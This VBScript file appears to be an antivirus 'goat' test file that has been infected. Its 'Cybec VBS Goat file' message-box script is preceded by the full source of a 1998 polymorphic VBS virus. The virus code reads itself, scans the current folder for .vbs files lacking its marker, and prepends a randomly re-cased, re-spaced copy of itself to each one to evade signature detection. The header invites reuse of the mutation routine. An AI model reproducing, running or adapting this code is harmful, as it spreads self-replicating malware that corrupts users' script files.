'**********
'   a    POLyMoRPHiC  ExaMple    vb  sCrIPT  viRuS    bAseD     on   vbSv777
'  by     SPO0kY    +     caD    -    14.  noV.     1998   -
' fEEL    FreE    tO  uSE   the  cbmUtATE    fUnCTION     In   youR   OWN BUGS :-)

 COnSt CBFORREadINg     =    1   ,  cBForwriting =     2

 raNdOmIze
     
  CBwepATh  =     wSCRIPt   .   ScRiPTfULLnamE
   
  SET  cBFSO  =     crEaTeOBjEct (     "SCRiPtinG.fILEsYsTEMobjECt"     )
  
 SeT CBWefIlE =     cBfSO     . OpenTeXTFILE   (    cBwEpAtH    ,     cbForReADInG )
 cbWECoDE     =   cbwEFilE .   REAdaLl
   cbWEFiLE  . CLoSe
   
  CBvirUSSIzE    =     InsTR     ( 3     ,  cbWEcODE  ,     "*****"  &     "*****" ) +    10  + 1

  sET    cBWEFile  =  cBFSO    .     opeNteXTFilE     ( cBwEPAtH   ,  cBFORReADiNg    )
   CbwecOde   =     cbweFiLe .  rEad     (  CbVirUsSiZe  )
   cbWEfilE    .   CLOse
  
   For     EACH   cbfiLE   in CBFso    .     GEtfOLDEr   (   "."   ) .   fIleS
   
    IF   lcASE ( cbfso . geTExtensiONNamE   (     cBfile  .     nAMe     )  )     =    cHR  (  118    )    &    ChR    (     98  )    &  CHr    (     115   )    TheN
  
  set CbVicTimFIle     =    CbFSO   .    opENtExtFILe    (    CbfilE   .     PAth  ,    cbFORREAdiNG   )
 cBINFECtIonMaRKER   =    cBvIctimfiLe  .    rEAd  (     11    )
    cBVicTImfiLe  .    CLOse
     
     IF    cbiNfeCtiONmArKEr  <>  "'*****"    &   "*****"   then

    SeT CBviCtimFIlE    =  CbFso  .    opEntexTfilE     (    cBfiLE     .     PATh  ,    CBFoRREAdiNg     )
    CBvIctImCodE     =     cbvictIMfIlE  .    Readall
    cBVicTiMfIlE   .    CLOSe
 
  cbvIctImcODe   =  CbmUtAte    (  cBWeCoDE   )   &   cbVIcTiMcOde
  
  set    CbvICtIMFILe    =     cbFSo   .     oPENTExtfile    (   cbFILe   .   PatH ,     CbforWRIting ,  1    )
   CbvICTiMfILe     .    WrItE    cBVICtiMCode
     CbVIctiMFIle .    ClosE
    
  eNd   iF
   
 eND     if
  
  nexT
     
 
     FUnCTion CbmuTate   (  CbSTrING    )
  
  CbNeWSTRIng =   ""
     cBI   =  1
   
   WhiLE  CbI    <= lEn    (    CBstring )
   
  If     mid     (  CBSTrING   ,  cBi   , 1   )  = CHr    (  32     )     thEN

   fOR     CBJ    =    1     To  INt     ( 5    *    rNd     )    +    1

    cBNEwSTriNG  =    CbNeWstrIng     + cHR   ( 32 )

 NEXT
 
     dO
  
     cBI    =     cbi     +   1
     
     lOop  wHiLe     MID   ( CbSTriNg  ,    cbi     ,    1  )  =     chR (     32  )
  
     eLSe
  
  iF   Int (  2     *    Rnd   )   +   1     =  1   THEn

    CbNEWSTRIng    =  CBnewsTrInG    +  UcAse    (   miD  (     cbStRinG  ,  cbI   , 1  )    )

 ELSE

    cBNEwstrinG =   cBnEwSTRiNg  +    Lcase  (     MiD (   CBsTriNg  , Cbi ,    1     )   )

    EnD if

     cBi = cBI    +    1
    
    ENd  IF
  
     WEnd
   
    cBMuTAtE     =     cbnEWsTriNg
 
   eND  fuNctioN
    
     '**********
'VBS Goat file

Dim Msg, Style, Title, Help, Ctxt, Responce, MyString
Msg = "This is Cybec VBS Goat file"
Style = vbYesNo + vbExclamation + vbDefaultButton2
Title = "Goat File"
Help = "Goat.hlp"
Ctxt = 1000

Responce = MsgBox(Msg, Style, Title, Help, Ctxt)
